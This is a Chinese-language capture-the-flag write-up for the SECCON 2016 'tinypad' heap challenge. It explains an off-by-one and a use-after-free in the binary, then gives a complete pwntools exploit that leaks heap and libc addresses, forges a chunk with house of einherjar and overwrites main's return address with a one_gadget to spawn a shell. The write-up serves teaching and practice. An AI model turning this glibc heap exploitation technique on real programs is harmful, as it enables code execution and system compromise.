# seccon-2016-tinypad

https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/#2016-seccon-tinypad

## 基本功能分析 ¶

首先，可以看出，程序以来一个核心的读取函数，即读取指定长度字节的字符串，然而，当读取的长度恰好为指定的长度时，会出现 off by one 的漏洞。

通过分析程序，我们不难看出，这个程序的基本功能是操作一个 tinypad，主要有以下操作

- 开头，程序每次开头依次判断每个 memo 的指针来判断是否为空，如果不为空，进而利用 strlen 求得其相应的长度，将 memo 的内容输出。从这里，我们也可以看出最多有 4 个 memo。
- 添加 memo，遍历存储 memo 的变量 tinypad，根据 tinypad 的存储的大小判断 memo 是否在使用，然后还有的话，分配一个 memo。从这里我们可以知道，程序只是从 tinypad 起始偏移 16*16=256 处才开始使用，每个 memo 存储两个字段，一个是该 memo 的大小，另一个是该 memo 对应的指针。所以我们可以创建一个新的结构体，并修改 ida 识别的 tinypad，使之更加可读（但是其实 ida 没有办法帮忙智能识别。）。同时，由于该添加功能依赖于读取函数，所以存在 off by one 的漏洞。此外，我们可以看出，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致。
- 删除，根据存储 memo 的大小判断 memo 是否在被使用，同时将相应 memo 大小设置为 0，但是并没有将指针设置为 NULL，有可能会导致 Use After Free。即在程序开头时，就有可能输出一些相关的内容，这其实就是我们泄漏一些基地址的基础。
- 编辑。在编辑时，程序首先根据之前存储的 memo 的内容将其拷贝到 tinypad 的前 256 个字节中，但正如我们之前所说的，当 memo 存储了 256 个字节时，就会存在 off by one 漏洞。与此同时，程序利用 strlen 判断复制之后的 tinypad 的内容长度，并将其输出。之后程序继续利用 strlen 求得 memo 的长度，并读取指定长度内容到 tinypad 中，根据读取函数，这里必然出现了 \x00。最后程序将读取到 tinypad 前 256 字节的内容放到对应 memo 中。
- 退出

## 利用 ¶

基本利用思路如下

1. 利用删除时没有将指针置为 NULL 的 UAF 漏洞，泄漏堆的基地址
2. 再次利用 UAF 漏洞泄漏 libc 的基地址。
3. 利用 house of einherjar 方法在 tinypad 的前 256 字节中伪造 chunk。当我们再次申请时，那么就可以控制 4 个 memo 的指针和内容了。
4. 这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。所以我们直接覆盖，所以这里采用其他方法，即修改程序的 main 函数的返回地址为 one_gadget，之所以可以行得通，是因为返回地址往往是 7f 开头的，长度足够长，可以覆盖为 one_gadget。所以我们还是需要泄漏 main 函数的返回地址，由于 libc 中存储了 main 函数 environ 指针的地址，所以我们可以先泄露出 environ 的地址，然后在得知存储 main 函数的返回地址的地址。这里选取 environ 符号是因为 environ 符号在 libc 中会导出，而像 argc 和 argv 则不会导出，相对来说会比较麻烦一点。
5. 最后修改 main 函数的返回地址为 one_gadget 地址获取 shell。

具体利用脚本如下

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
tinypad = ELF("./tinypad")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
    libc = ELF('./libc.so.6')
else:
    p = process("./tinypad")
    libc = ELF('./libc.so.6')
    main_arena_offset = 0x3c4b20
log.info('PID: ' + str(proc.pidof(p)[0]))


def add(size, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('a')
    p.recvuntil('(SIZE)>>> ')
    p.sendline(str(size))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)


def edit(idx, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('e')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil('Is it OK?\n')
    p.sendline('Y')


def delete(idx):
    p.recvuntil('(CMD)>>> ')
    p.sendline('d')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))


def run():
    p.recvuntil(
        '  ============================================================================\n\n'
    )
    # 1. leak heap base
    add(0x70, 'a' * 8)  # idx 0
    add(0x70, 'b' * 8)  # idx 1
    add(0x100, 'c' * 8)  # idx 2

    delete(2)  # delete idx 1
    delete(1)  # delete idx 0, idx 0 point to idx 1
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)  # get pointer point to idx1
    heap_base = u64(data.ljust(8, '\x00')) - 0x80
    log.success('get heap base: ' + hex(heap_base))

    # 2. leak libc base
    # this will trigger malloc_consolidate
    # first idx0 will go to unsorted bin
    # second idx1 will merge with idx0(unlink), and point to idx0
    # third idx1 will merge into top chunk
    # but cause unlink feture, the idx0's fd and bk won't change
    # so idx0 will leak the unsorted bin addr
    delete(3)
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)
    unsorted_offset_arena = 8 + 10 * 8
    main_arena = u64(data.ljust(8, '\x00')) - unsorted_offset_arena
    libc_base = main_arena - main_arena_offset
    log.success('main arena addr: ' + hex(main_arena))
    log.success('libc base addr: ' + hex(libc_base))

    # 3. house of einherjar
    add(0x18, 'a' * 0x18)  # idx 0
    # we would like trigger house of einherjar at idx 1
    add(0x100, 'b' * 0xf8 + '\x11')  # idx 1
    add(0x100, 'c' * 0xf8)  # idx 2
    add(0x100, 'd' * 0xf8)  #idx 3

    # create a fake chunk in tinypad's 0x100 buffer, offset 0x20
    tinypad_addr = 0x602040
    fakechunk_addr = tinypad_addr + 0x20
    fakechunk_size = 0x101
    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(
        fakechunk_addr)
    edit(3, 'd' * 0x20 + fakechunk)

    # overwrite idx 1's prev_size and
    # set minaddr of size to '\x00'
    # idx 0's chunk size is 0x20
    diff = heap_base + 0x20 - fakechunk_addr
    log.info('diff between idx1 and fakechunk: ' + hex(diff))
    # '\0' padding caused by strcpy
    diff_strip = p64(diff).strip('\0')
    number_of_zeros = len(p64(diff)) - len(diff_strip)
    for i in range(number_of_zeros + 1):
        data = diff_strip.rjust(0x18 - i, 'f')
        edit(1, data)
    delete(2)
    p.recvuntil('\nDeleted.')

    # fix the fake chunk size, fd and bk
    # fd and bk must be unsorted bin
    edit(4, 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) +
         p64(main_arena + 88))

    # 3. overwrite malloc_hook with one_gadget

    one_gadget_addr = libc_base + 0x45216
    environ_pointer = libc_base + libc.symbols['__environ']
    log.info('one gadget addr: ' + hex(one_gadget_addr))
    log.info('environ pointer addr: ' + hex(environ_pointer))
    #fake_malloc_chunk = main_arena - 60 + 9
    # set memo[0].size = 'a'*8,
    # set memo[0].content point to environ to leak environ addr
    fake_pad = 'f' * (0x100 - 0x20 - 0x10) + 'a' * 8 + p64(
        environ_pointer) + 'a' * 8 + p64(0x602148)
    # get a fake chunk
    add(0x100 - 8, fake_pad)  # idx 2
    #gdb.attach(p)

    # get environ addr
    p.recvuntil(' # CONTENT: ')
    environ_addr = p.recvuntil('\n', drop=True).ljust(8, '\x00')
    environ_addr = u64(environ_addr)
    main_ret_addr = environ_addr - 30 * 8

    # set memo[0].content point to main_ret_addr
    edit(2, p64(main_ret_addr))
    # overwrite main_ret_addr with one_gadget addr
    edit(1, p64(one_gadget_addr))
    p.interactive()


if __name__ == "__main__":
    run()
```
